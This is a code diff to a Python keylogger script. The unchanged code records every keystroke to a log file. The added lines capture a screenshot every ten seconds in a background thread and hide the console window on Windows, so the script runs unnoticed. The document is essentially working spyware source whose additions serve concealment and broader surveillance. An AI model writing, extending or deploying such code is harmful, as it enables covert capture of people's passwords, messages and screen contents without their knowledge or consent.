@@ -28,8 +28,27 @@ __copyright__ = "COPYRIGHT (c) 2024 Darren Morrison. All rights reserved"
 __author__    = "Darren Morrison"
 __version__   = "0.0.1"
 #*****************************************************************************# pylint: enable=duplicate-code
+import os
+import sys
 from pynput.keyboard import Key, Listener
 from datetime import datetime
+import time
+import threading
+from PIL import ImageGrab
+
+def capture_screenshot():
+    screenshot = ImageGrab.grab()
+    screenshot.save(f"screenshot_{int(time.time())}.png")
+
+def screenshot_timer(interval):
+    while True:
+        capture_screenshot()
+        time.sleep(interval)
+
+def hide_console():
+    if os.name == 'nt':
+        import ctypes
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def on_press(key):
     with open("log.txt", "a") as log_file:
@@ -41,6 +60,12 @@ def on_press(key):
 def on_release(key):
     if key == Key.esc:
         return False
+    
+if __name__ == "__main__":
+    hide_console()
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    screenshot_interval = 10  # Interval in seconds
+    threading.Thread(target=screenshot_timer, args=(screenshot_interval,), daemon=True).start()
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
